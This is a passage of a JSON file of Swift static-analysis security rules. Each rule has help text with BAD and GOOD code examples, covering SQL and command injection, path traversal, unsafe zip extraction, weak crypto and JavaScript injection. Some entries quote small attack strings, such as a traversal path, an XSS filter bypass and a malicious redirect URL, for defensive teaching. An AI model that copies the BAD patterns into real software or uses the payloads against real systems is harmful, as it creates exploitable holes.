Forgery](https://www.owasp.org/index.php/Server_Side_Request_Forgery).\n* OWASP: [Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html).\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n"
  },
  "swift/static-initialization-vector": {
    "name": "Static initialization vector for encryption",
    "description": "Using a static initialization vector (IV) for encryption is not secure. To maximize encryption and prevent dictionary attacks, IVs should be unique and unpredictable.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "id": "swift/static-initialization-vector",
    "tags": [
      "security",
      "external/cwe/cwe-329",
      "external/cwe/cwe-1204"
    ],
    "filename": "2e08e825-StaticInitializationVector",
    "language": "swift",
    "help": "# Static initialization vector for encryption\nWhen a cipher is used in certain modes (such as CBC or GCM), it requires an initialization vector (IV). Under the same secret key, IVs should be unique and ideally unpredictable. If the same IV is used with the same secret key, then the same plaintext results in the same ciphertext. This behavior may enable an attacker to learn if the same data pieces are transferred or stored, or help the attacker run a dictionary attack.\n\nIn particular, if the IV is hardcoded or constant, an attacker may just look up potential keys in a dictionary, then concatenate those with the hardcoded or constant IV rather than trying to discover the entire encryption key.\n\n\n## Recommendation\nUse a randomly generated IV.\n\n\n## Example\nThe following example shows a few cases of instantiating a cipher with various encryption keys. In the 'BAD' cases, the IV is hardcoded or constant, making the encrypted data vulnerable to recovery. In the 'GOOD' cases, the IV is randomly generated and not hardcoded, which protects the encrypted data against recovery.\n\n\n```swift\n\nfunc encrypt(padding : Padding) {\n\t// ...\n\n\t// BAD: Using static IVs for encryption\n\tlet iv: Array<UInt8> = [0x2a, 0x3a, 0x80, 0x05]\n\tlet ivString = \"this is a constant string\"\n\tlet key = getRandomKey()\n\t_ = try AES(key: key, iv: ivString)\n\t_ = try CBC(iv: iv)\n\n\t// GOOD: Using randomly generated IVs for encryption\n\tlet iv = (0..<10).map({ _ in UInt8.random(in: 0...UInt8.max) })\n\tlet ivString = String(cString: iv)\n\tlet key = getRandomKey())\n\t_ = try AES(key: key, iv: ivString)\n\t_ = try CBC(iv: iv)\n\n\t// ...\n}\n\n```\n\n## References\n* Wikipedia: [Initialization vector](https://en.wikipedia.org/wiki/Initialization_vector).\n* National Institute of Standards and Technology: [Recommendation for Block Cipher Modes of Operation](https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38a.pdf).\n* National Institute of Standards and Technology: [FIPS 140-2: Security Requirements for Cryptographic Modules](https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.140-2.pdf).\n* Common Weakness Enumeration: [CWE-329](https://cwe.mitre.org/data/definitions/329.html).\n* Common Weakness Enumeration: [CWE-1204](https://cwe.mitre.org/data/definitions/1204.html).\n"
  },
  "swift/path-injection": {
    "name": "Uncontrolled data used in path expression",
    "description": "Accessing paths influenced by users can allow an attacker to access unexpected resources.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "id": "swift/path-injection",
    "tags": [
      "security",
      "external/cwe/cwe-022",
      "external/cwe/cwe-023",
      "external/cwe/cwe-036",
      "external/cwe/cwe-073",
      "external/cwe/cwe-099"
    ],
    "filename": "46482e68-PathInjection",
    "language": "swift",
    "help": "# Uncontrolled data used in path expression\nAccessing paths controlled by users can expose resources to attackers.\n\nPaths that are naively constructed from data controlled by a user may contain unexpected special characters, such as `..`. Such a path could point to any directory on the file system.\n\n\n## Recommendation\nValidate user input before using it to construct a file path. Ideally, follow these rules:\n\n* Do not allow more than a single `.` character.\n* Do not allow directory separators such as `/` or `\\` (depending on the file system).\n* Do not rely on simply replacing problematic sequences such as `../`. For example, after applying this filter to `.../...//` the resulting string would still be `../`.\n* Use a whitelist of known good patterns.\n\n## Example\nThe following code shows two bad examples.\n\n\n```swift\nlet fm = FileManager.default\nlet path = try String(contentsOf: URL(string: \"http://example.com/\")!)\n\n// BAD\nreturn fm.contents(atPath: path)\n\n// BAD\nif (path.hasPrefix(NSHomeDirectory() + \"/Library/Caches\")) {\n    return fm.contents(atPath: path)\n}\n\n```\nIn the first, a file name is read from an HTTP request and then used to access a file. In this case, a malicious response could include a file name that is an absolute path, such as `\"/Applications/(current_application)/Documents/sensitive.data\"`.\n\nIn the second bad example, it appears that the user is restricted to opening a file within the `\"/Library/Caches\"` home directory. In this case, a malicious response could contain a file name containing special characters. For example, the string `\"../../Documents/sensitive.data\"` will result in the code reading the file located at `\"/Applications/(current_application)/Library/Caches/../../Documents/sensitive.data\"`, which contains users' sensitive data. This file may then be made accessible to an attacker, giving them access to all this data.\n\nIn the following (good) example, the path used to access the file system is normalized *before* being checked against a known prefix. This ensures that regardless of the user input, the resulting path is safe.\n\n\n```swift\nlet fm = FileManager.default\nlet path = try String(contentsOf: URL(string: \"http://example.com/\")!)\n\n// GOOD\nlet filePath = FilePath(stringLiteral: path)\nif (filePath.lexicallyNormalized().starts(with: FilePath(stringLiteral: NSHomeDirectory() + \"/Library/Caches\"))) {\n    return fm.contents(atPath: path)\n}\n\n```\n\n## References\n* OWASP: [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal).\n* Common Weakness Enumeration: [CWE-22](https://cwe.mitre.org/data/definitions/22.html).\n* Common Weakness Enumeration: [CWE-23](https://cwe.mitre.org/data/definitions/23.html).\n* Common Weakness Enumeration: [CWE-36](https://cwe.mitre.org/data/definitions/36.html).\n* Common Weakness Enumeration: [CWE-73](https://cwe.mitre.org/data/definitions/73.html).\n* Common Weakness Enumeration: [CWE-99](https://cwe.mitre.org/data/definitions/99.html).\n"
  },
  "swift/weak-password-hashing": {
    "name": "Use of an inappropriate cryptographic hashing algorithm on passwords",
    "description": "Using inappropriate cryptographic hashing algorithms with passwords can compromise security.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "high",
    "id": "swift/weak-password-hashing",
    "tags": [
      "security",
      "external/cwe/cwe-327",
      "external/cwe/cwe-328",
      "external/cwe/cwe-916"
    ],
    "filename": "8849d37c-WeakPasswordHashing",
    "language": "swift",
    "help": "# Use of an inappropriate cryptographic hashing algorithm on passwords\nHash functions that are not sufficiently computationally hard can leave data vulnerable. You should not use such functions for password hashing.\n\nA strong cryptographic hash function should be resistant to:\n\n* **Pre-image attacks**. If you know a hash value `h(x)`, you should not be able to easily find the input `x`.\n* **Collision attacks**. If you know a hash value `h(x)`, you should not be able to easily find a different input `y` with the same hash value `h(x) = h(y)`.\n* **Brute force**. If you know a hash value `h(x)`, you should not be able to find an input `y` that computes to that hash value using brute force attacks without significant computational effort.\nAll of MD5, SHA-1, SHA-2 and SHA-3 are weak against offline brute forcing, since they are not sufficiently computationally hard. This includes SHA-224, SHA-256, SHA-384 and SHA-512, which are in the SHA-2 family.\n\nPassword hashing algorithms should be slow and/or memory intensive to compute, to make brute force attacks more difficult.\n\n\n## Recommendation\nFor password storage, you should use a sufficiently computationally hard cryptographic hash function, such as one of the following:\n\n* Argon2\n* scrypt\n* bcrypt\n* PBKDF2\n\n## Example\nThe following examples show two versions of the same function. In both cases, a password is hashed using a cryptographic hashing algorithm. In the first case, the SHA-512 hashing algorithm is used. It is vulnerable to offline brute force attacks:\n\n\n```swift\nlet passwordData = Data(passwordString.utf8)\nlet passwordHash = Crypto.SHA512.hash(data: passwordData) // BAD: SHA-512 is not suitable for password hashing.\n\n// ...\n\nif Crypto.SHA512.hash(data: Data(passwordString.utf8)) == passwordHash {\n    // ...\n}\n\n```\nHere is the same function using Argon2, which is suitable for password hashing:\n\n\n```swift\nimport Argon2Swift\n\nlet salt = Salt.newSalt()\nlet result = try! Argon2Swift.hashPasswordString(password: passwordString, salt: salt) // GOOD: Argon2 is suitable for password hashing.\nlet passwordHash = result.encodedString()\n\n// ...\n\nif try! Argon2Swift.verifyHashString(password: passwordString, hash: passwordHash) {\n    // ...\n}\n\n```\n\n## References\n* OWASP: [Password Storage Cheat Sheet ](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)\n* GitHub: [CryptoSwift README - Password-Based Key Derivation Function](https://github.com/krzyzanowskim/CryptoSwift/blob/main/README.md#password-based-key-derivation-function)\n* libsodium: [libsodium bindings for other languages](https://doc.libsodium.org/bindings_for_other_languages#bindings-programming-languages)\n* GitHub: [Argon2Swift](https://github.com/tmthecoder/Argon2Swift)\n* Common Weakness Enumeration: [CWE-327](https://cwe.mitre.org/data/definitions/327.html).\n* Common Weakness Enumeration: [CWE-328](https://cwe.mitre.org/data/definitions/328.html).\n* Common Weakness Enumeration: [CWE-916](https://cwe.mitre.org/data/definitions/916.html).\n"
  },
  "swift/insecure-tls": {
    "name": "Insecure TLS configuration",
    "description": "TLS v1.0 and v1.1 versions are known to be vulnerable. TLS v1.2 or v1.3 should be used instead.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "id": "swift/insecure-tls",
    "tags": [
      "security",
      "external/cwe/cwe-757"
    ],
    "filename": "9aca9a86-InsecureTLS",
    "language": "swift",
    "help": "# Insecure TLS configuration\nTLS v1.0 and v1.1 versions are known to be vulnerable.\n\n\n## Recommendation\nUse `tls_protocol_version_t.TLSv12` or `tls_protocol_version_t.TLSv13` when configuring `URLSession`.\n\n\n## Example\nSpecify a newer `tls_protocol_version_t` explicitly, or omit it completely as the OS will use secure defaults.\n\n\n```swift\n// Set TLS version explicitly\nfunc createURLSession() -> URLSession {\n  let config = URLSessionConfiguration.default\n  config.tlsMinimumSupportedProtocolVersion = tls_protocol_version_t.TLSv13\n  return URLSession(configuration: config)\n}\n\n// Use the secure OS defaults\nfunc createURLSession() -> URLSession {\n  let config = URLSessionConfiguration.default\n  return URLSession(configuration: config)\n}\n\n```\n\n## References\n* [Apple Platform Security - TLS security](https://support.apple.com/en-gb/guide/security/sec100a75d12/web) [Preventing Insecure Network Connections](https://developer.apple.com/documentation/security/preventing_insecure_network_connections)\n* Common Weakness Enumeration: [CWE-757](https://cwe.mitre.org/data/definitions/757.html).\n"
  },
  "swift/missing-regexp-anchor": {
    "name": "Missing regular expression anchor",
    "description": "Regular expressions without anchors can be vulnerable to bypassing.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.8,
    "precision": "high",
    "id": "swift/missing-regexp-anchor",
    "tags": [
      "correctness",
      "security",
      "external/cwe/cwe-020"
    ],
    "filename": "1acdb811-MissingRegexAnchor",
    "language": "swift",
    "help": "# Missing regular expression anchor\nSanitizing untrusted input with regular expressions is a common technique, but malicious actors may be able to embed one of the allowed patterns in an unexpected location. To prevent this, you should use anchors in your regular expressions, such as `^` or `$`.\n\nEven if the matching is not done in a security-critical context, it may still cause undesirable behavior when the regular expression accidentally matches.\n\n\n## Recommendation\nUse anchors to ensure that regular expressions match at the expected locations.\n\n\n## Example\nThe following example code attempts to check that a URL redirection will reach the `example.com` domain, and not a malicious site:\n\n\n```swift\nfunc handleUrl(_ urlString: String) {\n    // get the 'url=' parameter from the URL\n    let components = URLComponents(string: urlString)\n    let redirectParam = components?.queryItems?.first(where: { $0.name == \"url\" })\n\n    // check we trust the host\n    let regex = try Regex(#\"https?://www\\.example\\.com\"#) // BAD: the host of `url` may be controlled by an attacker\n    if let match = redirectParam?.value?.firstMatch(of: regex) {\n        // ... trust the URL ...\n    }\n}\n\n```\nHowever, this regular expression check can be easily bypassed, and a malicious actor could embed `http://www.example.com/` in the query string component of a malicious site. For example, `http://evil-example.net/?x=http://www.example.com/`. Instead, you should use anchors in the regular expression check:\n\n\n```swift\nfunc handleUrl(_ urlString: String) {\n    // get the 'url=' parameter from the URL\n    let components = URLComponents(string: urlString)\n    let redirectParam = components?.queryItems?.first(where: { $0.name == \"url\" })\n\n    // check we trust the host\n    let regex = try Regex(#\"^https?://www\\.example\\.com\"#) // GOOD: the host of `url` can not be controlled by an attacker\n    if let match = redirectParam?.value?.firstMatch(of: regex) {\n        // ... trust the URL ...\n    }\n}\n\n```\nIf you need to write a regular expression to match multiple hosts, you should include an anchor for all of the alternatives. For example, the regular expression `/^www\\.example\\.com|beta\\.example\\.com/` will match the host `evil.beta.example.com`, because the regular expression is parsed as `/(^www\\.example\\.com)|(beta\\.example\\.com)/`.\n\n\n## References\n* OWASP: [SSRF](https://www.owasp.org/index.php/Server_Side_Request_Forgery)\n* OWASP: [XSS Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html).\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n"
  },
  "swift/unsafe-unpacking": {
    "name": "Arbitrary file write during a zip extraction from a user controlled source",
    "description": "Unpacking user controlled zips without validating whether the destination file path is within the destination directory can cause files outside the destination directory to be overwritten.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "id": "swift/unsafe-unpacking",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-022"
    ],
    "filename": "8112b7f3-UnsafeUnpack",
    "language": "swift",
    "help": "# Arbitrary file write during a zip extraction from a user controlled source\nUnpacking files from a malicious zip without properly validating that the destination file path is within the destination directory, or allowing symlinks to point to files outside the extraction directory, allows an attacker to extract files to arbitrary locations outside the extraction directory. This helps overwrite sensitive user data and, in some cases, can lead to code execution if an attacker overwrites an application's shared object file.\n\n\n## Recommendation\nConsider using a safer module, such as: `ZIPArchive`\n\n\n## Example\nThe following examples unpacks a remote zip using \\`Zip.unzipFile()\\` which is vulnerable to path traversal.\n\n\n```swift\nimport Foundation\nimport Zip\n\n\nfunc unzipFile(at sourcePath: String, to destinationPath: String) {\n    do {\n        let remoteURL = URL(string: \"https://example.com/\")!\n\n        let source  = URL(fileURLWithPath: sourcePath)\n        let destination = URL(fileURLWithPath: destinationPath)\n\n        // Malicious zip is downloaded \n        try Data(contentsOf: remoteURL).write(to: source)\n\n        let fileManager = FileManager()\n        // Malicious zip is unpacked\n        try Zip.unzipFile(source, destination: destination, overwrite: true, password: nil)\n        } catch {\n    }\n}\n\nfunc main() {\n    let sourcePath = \"/sourcePath\" \n    let destinationPath = \"/destinationPath\" \n    unzipFile(at: sourcePath, to: destinationPath)\n}\n\nmain()\n```\nThe following examples unpacks a remote zip using \\`fileManager.unzipItem()\\` which is vulnerable to symlink path traversal.\n\n\n```swift\nimport Foundation\nimport ZIPFoundation\n\n\nfunc unzipFile(at sourcePath: String, to destinationPath: String) {\n    do {\n        let remoteURL = URL(string: \"https://example.com/\")!\n\n        let source  = URL(fileURLWithPath: sourcePath)\n        let destination = URL(fileURLWithPath: destinationPath)\n\n        // Malicious zip is downloaded \n        try Data(contentsOf: remoteURL).write(to: source)\n\n        let fileManager = FileManager()\n        // Malicious zip is unpacked\n        try fileManager.unzipItem(at:source, to: destination)\n        } catch {\n    }\n}\n\nfunc main() {\n    let sourcePath = \"/sourcePath\" \n    let destinationPath = \"/destinationPath\" \n    unzipFile(at: sourcePath, to: destinationPath)\n}\n\nmain()\n```\nConsider using a safer module, such as: `ZIPArchive`\n\n\n```swift\nimport Foundation\nimport ZipArchive\n\nfunc unzipFile(at sourcePath: String, to destinationPath: String) {\n    do {\n        let remoteURL = URL(string: \"https://example.com/\")!\n\n        let source  = URL(fileURLWithPath: sourcePath)\n\n        // Malicious zip is downloaded \n        try Data(contentsOf: remoteURL).write(to: source)\n\n        // ZipArchive is safe\n        try SSZipArchive.unzipFile(atPath: sourcePath, toDestination: destinationPath, delegate: self)\n        } catch {\n    }\n}\n\nfunc main() {\n    let sourcePath = \"/sourcePath\" \n    let destinationPath = \"/destinationPath\" \n    unzipFile(at: sourcePath, to: destinationPath)\n}\n\nmain()\n```\n\n## References\n* Ostorlab: [Zip Packages Exploitation](https://blog.ostorlab.co/zip-packages-exploitation.html).\n* Common Weakness Enumeration: [CWE-22](https://cwe.mitre.org/data/definitions/22.html).\n"
  },
  "swift/ecb-encryption": {
    "name": "Encryption using ECB",
    "description": "Using the ECB encryption mode makes code vulnerable to replay attacks.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "high",
    "id": "swift/ecb-encryption",
    "tags": [
      "security",
      "external/cwe/cwe-327"
    ],
    "filename": "b1892dc4-ECBEncryption",
    "language": "swift",
    "help": "# Encryption using ECB\nECB should not be used as a mode for encryption as it has dangerous weaknesses. Data is encrypted the same way every time, which means that the same plaintext input will always produce the same ciphertext. This behavior makes messages encrypted with ECB more vulnerable to replay attacks.\n\n\n## Recommendation\nUse a different cipher mode such as CBC.\n\n\n## Example\nThe following example shows six cases of instantiating a cipher with various encryption keys and block modes. In the 'BAD' cases, the mode of encryption is ECB, making the encrypted data vulnerable to replay attacks. In the 'GOOD' cases, the encryption mode is CBC, which protects the encrypted data against replay attacks.\n\n\n```swift\n\nfunc encrypt(key : Key, padding : Padding) {\n\t// ...\n\n\t// BAD: ECB is used for block mode\n\tlet blockMode = ECB()\n\t_ = try AES(key: key, blockMode: blockMode, padding: padding)\n\t_ = try AES(key: key, blockMode: blockMode)\n\t_ = try Blowfish(key: key, blockMode: blockMode, padding: padding)\n\n\t// GOOD: ECB is not used for block mode\n\tlet aesBlockMode = CBC(iv: AES.randomIV(AES.blockSize))\n\tlet blowfishBlockMode = CBC(iv: Blowfish.randomIV(Blowfish.blockSize))\n\t_ = try AES(key: key, blockMode: aesBlockMode, padding: padding)\n\t_ = try AES(key: key, blockMode: aesBlockMode)\n\t_ = try Blowfish(key: key, blockMode: blowfishBlockMode, padding: padding)\n\n\t// ...\n}\n\n```\n\n## References\n* Wikipedia, block cipher modes of operation, [Electronic codebook (ECB)](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Electronic_codebook_.28ECB.29).\n* Common Weakness Enumeration: [CWE-327](https://cwe.mitre.org/data/definitions/327.html).\n"
  },
  "swift/unsafe-js-eval": {
    "name": "JavaScript Injection",
    "description": "Evaluating JavaScript code containing a substring from a remote source may lead to remote code execution.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 9.3,
    "precision": "medium",
    "id": "swift/unsafe-js-eval",
    "tags": [
      "security",
      "external/cwe/cwe-094",
      "external/cwe/cwe-095",
      "external/cwe/cwe-749"
    ],
    "filename": "e0ee899d-UnsafeJsEval",
    "language": "swift",
    "help": "# JavaScript Injection\nEvaluating JavaScript that contains a substring from a remote origin may lead to remote code execution. Code written by an attacker can execute unauthorized actions, including exfiltration of local data through a third party web service.\n\n\n## Recommendation\nWhen loading JavaScript into a web view, evaluate only known, locally-defined source code. If part of the input comes from a remote source, do not inject it into the JavaScript code to be evaluated. Instead, send it to the web view as data using an API such as `WKWebView.callAsyncJavaScript` with the `arguments` dictionary to pass remote data objects.\n\n\n## Example\nIn the following (bad) example, a call to `WKWebView.evaluateJavaScript` evaluates JavaScript source code that is tainted with remote data, potentially introducing a code injection vulnerability.\n\n\n```swift\nlet webview: WKWebView\nlet remoteData = try String(contentsOf: URL(string: \"http://example.com/evil.json\")!)\n\n...\n\n_ = try await webview.evaluateJavaScript(\"console.log(\" + remoteData + \")\") // BAD\n\n```\nIn the following (good) example, we sanitize the remote data by passing it using the `arguments` dictionary of `WKWebView.callAsyncJavaScript`. This ensures that untrusted data cannot be evaluated as JavaScript source code.\n\n\n```swift\nlet webview: WKWebView\nlet remoteData = try String(contentsOf: URL(string: \"http://example.com/evil.json\")!)\n\n...\n\n_ = try await webview.callAsyncJavaScript(\n    \"console.log(data)\",\n    arguments: [\"data\": remoteData], // GOOD\n    contentWorld: .page\n)\n\n```\n\n## References\n* Apple Developer Documentation: [WKWebView.callAsyncJavaScript(_:arguments:in:contentWorld:)](https://developer.apple.com/documentation/webkit/wkwebview/3824703-callasyncjavascript)\n* Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).\n* Common Weakness Enumeration: [CWE-95](https://cwe.mitre.org/data/definitions/95.html).\n* Common Weakness Enumeration: [CWE-749](https://cwe.mitre.org/data/definitions/749.html).\n"
  },
  "swift/bad-tag-filter": {
    "name": "Bad HTML filtering regexp",
    "description": "Matching HTML tags using regular expressions is hard to do right, and can lead to security issues.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.8,
    "precision": "high",
    "id": "swift/bad-tag-filter",
    "tags": [
      "correctness",
      "security",
      "external/cwe/cwe-116",
      "external/cwe/cwe-020",
      "external/cwe/cwe-185",
      "external/cwe/cwe-186"
    ],
    "filename": "58ff250d-BadTagFilter",
    "language": "swift",
    "help": "# Bad HTML filtering regexp\nIt is possible to match some single HTML tags using regular expressions (parsing general HTML using regular expressions is impossible). However, if the regular expression is not written well, it might be possible to circumvent it. This can lead to cross-site scripting or other security issues.\n\nSome of these mistakes are caused by browsers having very forgiving HTML parsers, and will often render invalid HTML containing syntax errors. Regular expressions that attempt to match HTML should also recognize tags containing such syntax errors.\n\n\n## Recommendation\nUse a well-tested sanitization or parser library if at all possible. These libraries are much more likely to handle corner cases correctly than a custom implementation.\n\n\n## Example\nThe following example attempts to filters out all `<script>` tags.\n\n\n```\nlet script_tag_regex = /<script[^>]*>.*<\\/script>/\n\nvar old_html = \"\"\nwhile (html != old_html) {\n  old_html = html\n  html.replace(script_tag_regex, with: \"\")\n}\n\n...\n\n```\nThe above sanitizer does not filter out all `<script>` tags. Browsers will not only accept `</script>` as script end tags, but also tags such as `</script foo=\"bar\">` even though it is a parser error. This means that an attack string such as `<script>alert(1)</script foo=\"bar\">` will not be filtered by the function, and `alert(1)` will be executed by a browser if the string is rendered as HTML.\n\nOther corner cases include HTML comments ending with `--!>`, and HTML tag names containing uppercase characters.\n\n\n## References\n* Securitum: [The Curious Case of Copy &amp; Paste](https://research.securitum.com/the-curious-case-of-copy-paste/).\n* stackoverflow.com: [You can't parse \\[X\\]HTML with regex](https://stackoverflow.com/questions/1732348/regex-match-open-tags-except-xhtml-self-contained-tags#answer-1732454).\n* HTML Standard: [Comment end bang state](https://html.spec.whatwg.org/multipage/parsing.html#comment-end-bang-state).\n* stackoverflow.com: [Why aren't browsers strict about HTML?](https://stackoverflow.com/questions/25559999/why-arent-browsers-strict-about-html)\n* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n* Common Weakness Enumeration: [CWE-185](https://cwe.mitre.org/data/definitions/185.html).\n* Common Weakness Enumeration: [CWE-186](https://cwe.mitre.org/data/definitions/186.html).\n"
  },
  "swift/sql-injection": {
    "name": "Database query built from user-controlled sources",
    "description": "Building a database query from user-controlled sources is vulnerable to insertion of malicious code by the user.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 8.8,
    "precision": "high",
    "id": "swift/sql-injection",
    "tags": [
      "security",
      "external/cwe/cwe-089"
    ],
    "filename": "7cf8f9d2-SqlInjection",
    "language": "swift",
    "help": "# Database query built from user-controlled sources\nIf a database query (such as a SQL query) is built from user-provided data without sufficient sanitization, a user may be able to run malicious database queries. An attacker can craft the part of the query they control to change the overall meaning of the query.\n\n\n## Recommendation\nMost database connector libraries offer a way to safely embed untrusted data into a query using query parameters or prepared statements. You should use these features to build queries, rather than string concatenation or similar methods. You can also escape (sanitize) user-controlled strings so that they can be included directly in an SQL command. A library function should be used for escaping, because this approach is only safe if the escaping function is robust against all possible inputs.\n\n\n## Example\nIn the following examples, an SQL query is prepared using string interpolation to directly include a user-controlled value `userControlledString` in the query. An attacker could craft `userControlledString` to change the overall meaning of the SQL query.\n\n\n```swift\n// with SQLite.swift\n\nlet unsafeQuery = \"SELECT * FROM users WHERE username='\\(userControlledString)'\"\n\ntry db.execute(unsafeQuery) // BAD\n\nlet stmt = try db.prepare(unsafeQuery) // also BAD\ntry stmt.run()\n\n// with SQLite3 C API\n\nlet result = sqlite3_exec(db, unsafeQuery, nil, nil, nil) // BAD\n\n```\nA better way to do this is with a prepared statement, binding `userControlledString` to a parameter of that statement. An attacker who controls `userControlledString` now cannot change the overall meaning of the query.\n\n\n```swift\n// with SQLite.swift\n\nlet safeQuery = \"SELECT * FROM users WHERE username=?\"\n\nlet stmt = try db.prepare(safeQuery, userControlledString) // GOOD\ntry stmt.run()\n\n// with sqlite3 C API\n\nvar stmt2: OpaquePointer?\n\nif (sqlite3_prepare_v2(db, safeQuery, -1, &stmt2, nil) == SQLITE_OK) {\n\tif (sqlite3_bind_text(stmt2, 1, userControlledString, -1, SQLITE_TRANSIENT) == SQLITE_OK) { // GOOD\n\t\tlet result = sqlite3_step(stmt2)\n\n\t\t// ...\n\t}\n\tsqlite3_finalize(stmt2)\n}\n\n```\n\n## References\n* Wikipedia: [SQL injection](https://en.wikipedia.org/wiki/SQL_injection).\n* OWASP: [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html).\n* Common Weakness Enumeration: [CWE-89](https://cwe.mitre.org/data/definitions/89.html).\n"
  },
  "swift/command-line-injection": {
    "name": "System command built from user-controlled sources",
    "description": "Building a system command from user-controlled sources may allow a malicious user to change the meaning of the command.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.8,
    "precision": "high",
    "id": "swift/command-line-injection",
    "tags": [
      "security",
      "external/cwe/cwe-078",
      "external/cwe/cwe-088"
    ],
    "filename": "720415c4-CommandInjection",
    "language": "swift",
    "help": "# System command built from user-controlled sources\nConstructing a system command with unsanitized user input is dangerous, since a malicious user may be able to craft input that executes arbitrary code.\n\n\n## Recommendation\nIf possible, use hard-coded string literals to specify the command to run. Instead of interpreting user input directly as command names, examine the input and then choose among hard-coded string literals.\n\nIf this is not possible, then add sanitization code to verify that the user input is safe before using it.\n\n\n## Example\nThe following example executes code from user input without sanitizing it first:\n\n\n```swift\nvar task = Process()\ntask.launchPath = \"/bin/bash\"\ntask.arguments = [\"-c\", userControlledString] // BAD\n\ntask.launch()\n```\nIf user input is used to construct a command it should be checked first. This ensures that the user cannot insert characters that have special meanings:\n\n\n```swift\nfunc validateCommand(_ command: String) -> String? {\n    let allowedCommands = [\"ls -l\", \"pwd\", \"echo\"]\n    if allowedCommands.contains(command) {\n        return command\n    }\n    return nil\n}\n\nif let validatedString = validateCommand(userControlledString) {\n    var task = Process()\n    task.launchPath = \"/bin/bash\"\n    task.arguments = [\"-c\", validatedString] // GOOD\n\n    task.launch()\n}\n\n```\n\n## References\n* OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection).\n* Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).\n* Common Weakness Enumeration: [CWE-88](https://cwe.mitre.org/data/definitions/88.html).\n"
  },
  "swift/cleartext-logging": {
    "name": "Cleartext logging of sensitive information",
    "description": "Logging sensitive information in plaintext can expose it to an attacker.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "id": "swift/cleartext-logging",
    "tags": [
      "security",
      "external/cwe/cwe-312",
      "external/cwe/cwe-359",
      "external/cwe/cwe-532"
    ],
    "filename": "490a3077-CleartextLogging",
    "language": "swift",
    "help": "# Cleartext logging of sensitive information\nAttackers could gain access to sensitive information that is logged unencrypted.\n\n\n## Recommendation\nAlways make sure to encrypt or obfuscate sensitive information before you log it.\n\nGenerally, you should decrypt sensitive information only at the point where it is necessary for it to be used in cleartext.\n\nBe aware that external processes often store the standard output and standard error streams of the application. This will include logged sensitive information.\n\n\n## Example\nThe following example code logs user credentials (in this case, their password) in plaintext:\n\n\n```swift\nlet password = \"P@ssw0rd\"\nNSLog(\"User password changed to \\(password)\")\n\n```\nInstead, you should encrypt or obfuscate the credentials, or omit them entirely:\n\n\n```swift\nlet password = \"P@ssw0rd\"\nNSLog(\"User password changed\")\n\n```\n\n## References\n* M. Dowd, J. McDonald and J. Schuhm, *The Art of Software Security Assessment*, 1st Edition, Chapter 2 - 'Common Vulnerabilities of Encryption', p. 43. Addison Wesley, 2006.\n* M. Howard and D. LeBlanc, *Writing Secure Code*, 2nd Edition, Chapter 9 - 'Protecting Secret Data', p. 299. Microsoft, 2002.\n* OWASP: [Password Plaintext Storage](https://www.owasp.org/index.php/Password_Plaintext_Storage).\n* Common Weakness Enumeration: [CWE-312](https://cwe.mitre.org/data/definitions/312.html).\n* Common Weakness Enumeration: [CWE-359](https://cwe.mitre.org/data/definitions/359.html).\n* Common Weakness Enumeration: [CWE-532](https://cwe.mitre.org/data/definitions/532.html).\n"
  },
  "swift/string-length-conflation": {
    "name": "String length conflation",
    "description": "Using a length value from an `NSString` in a `String`, or a count from a `String` in an `NSString`, may cause unexpected behavior.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.8,
    "precision": "high",
    "id": "swift/string-length-conflation",
    "tags": [
      "security",
      "external/cwe/cwe-135"
    ],
    "filename": "4ba53867-StringLengthConflation",
    "language": "swift",
